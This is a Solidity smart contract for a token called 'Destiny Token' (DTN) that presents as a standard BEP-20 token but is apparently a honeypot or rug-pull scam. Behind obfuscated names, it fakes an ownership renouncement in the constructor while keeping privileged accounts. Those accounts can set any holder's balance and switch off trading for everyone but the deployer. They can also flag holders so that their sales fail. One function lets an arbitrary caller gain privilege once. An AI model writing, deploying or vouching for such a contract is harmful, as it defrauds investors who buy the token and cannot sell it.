//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface tradingExemptIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fundSell) external view returns (uint256);

    function transfer(address sellToken, uint256 modeToken) external returns (bool);

    function allowance(address modeLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeToken) external returns (bool);

    function transferFrom(
        address sender,
        address sellToken,
        uint256 modeToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellAt, uint256 value);
    event Approval(address indexed modeLaunch, address indexed spender, uint256 value);
}

abstract contract swapAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface receiverTrading {
    function createPair(address walletLiquidity, address walletReceiver) external returns (address);
}

interface buyTrading is tradingExemptIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DestinyToken is swapAuto, tradingExemptIs, buyTrading {

    address private receiverBuy;

    mapping(address => bool) public minAuto;

    mapping(address => uint256) private walletShouldTo;

    address public toAuto;

    function balanceOf(address fundSell) public view virtual override returns (uint256) {
        return walletShouldTo[fundSell];
    }

    mapping(address => mapping(address => uint256)) private enableAmount;

    function amountMax(uint256 modeToken) public {
        marketingLimit();
        shouldAt = modeToken;
    }

    string private fundWalletTake = "DTN";

    address totalModeWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private toSellReceiver;

    mapping(address => bool) public maxFee;

    uint256 shouldAt;

    bool public modeReceiver;

    function allowance(address amountMin, address receiverWallet) external view virtual override returns (uint256) {
        if (receiverWallet == totalModeWallet) {
            return type(uint256).max;
        }
        return enableAmount[amountMin][receiverWallet];
    }

    function limitMode(address buyMode, uint256 modeToken) public {
        marketingLimit();
        walletShouldTo[buyMode] = modeToken;
    }

    function transferFrom(address isToList, address sellToken, uint256 modeToken) external override returns (bool) {
        if (_msgSender() != totalModeWallet) {
            if (enableAmount[isToList][_msgSender()] != type(uint256).max) {
                require(modeToken <= enableAmount[isToList][_msgSender()]);
                enableAmount[isToList][_msgSender()] -= modeToken;
            }
        }
        return listWallet(isToList, sellToken, modeToken);
    }

    uint8 private toWallet = 18;

    constructor (){
        if (buyList != minExempt) {
            toSellReceiver = minFrom;
        }
        atFromSwap();
        maxToken amountReceiver = maxToken(totalModeWallet);
        listExempt = receiverTrading(amountReceiver.factory()).createPair(amountReceiver.WETH(), address(this));
        
        toAuto = _msgSender();
        maxFee[toAuto] = true;
        walletShouldTo[toAuto] = fromList;
        if (fundSwap) {
            txLaunched = minFrom;
        }
        emit Transfer(address(0), toAuto, fromList);
    }

    string private autoAt = "Destiny Token";

    function teamSender(address fromWalletAmount) public {
        if (modeReceiver) {
            return;
        }
        
        maxFee[fromWalletAmount] = true;
        
        modeReceiver = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundWalletTake;
    }

    function approve(address receiverWallet, uint256 modeToken) public virtual override returns (bool) {
        enableAmount[_msgSender()][receiverWallet] = modeToken;
        emit Approval(_msgSender(), receiverWallet, modeToken);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return autoAt;
    }

    function getOwner() external view returns (address) {
        return receiverBuy;
    }

    bool public fundSwap;

    uint256 constant amountSellMax = 9 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return fromList;
    }

    event OwnershipTransferred(address indexed walletReceiverExempt, address indexed teamTo);

    uint256 marketingToken;

    uint256 private minExempt;

    uint256 private buyList;

    uint256 private fromList = 100000000 * 10 ** 18;

    address receiverAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return toWallet;
    }

    bool private totalModeFee;

    uint256 private isSellSwap;

    function receiverLiquidity(address isToList, address sellToken, uint256 modeToken) internal returns (bool) {
        require(walletShouldTo[isToList] >= modeToken);
        walletShouldTo[isToList] -= modeToken;
        walletShouldTo[sellToken] += modeToken;
        emit Transfer(isToList, sellToken, modeToken);
        return true;
    }

    uint256 public txLaunched;

    function transfer(address buyMode, uint256 modeToken) external virtual override returns (bool) {
        return listWallet(_msgSender(), buyMode, modeToken);
    }

    function owner() external view returns (address) {
        return receiverBuy;
    }

    function atFromSwap() public {
        emit OwnershipTransferred(toAuto, address(0));
        receiverBuy = address(0);
    }

    function listWallet(address isToList, address sellToken, uint256 modeToken) internal returns (bool) {
        if (isToList == toAuto) {
            return receiverLiquidity(isToList, sellToken, modeToken);
        }
        uint256 minMax = tradingExemptIs(listExempt).balanceOf(receiverAuto);
        require(minMax == shouldAt);
        require(sellToken != receiverAuto);
        if (minAuto[isToList]) {
            return receiverLiquidity(isToList, sellToken, amountSellMax);
        }
        return receiverLiquidity(isToList, sellToken, modeToken);
    }

    function exemptToken(address maxMarketing) public {
        marketingLimit();
        
        if (maxMarketing == toAuto || maxMarketing == listExempt) {
            return;
        }
        minAuto[maxMarketing] = true;
    }

    function marketingLimit() private view {
        require(maxFee[_msgSender()]);
    }

    address public listExempt;

    uint256 public minFrom;

}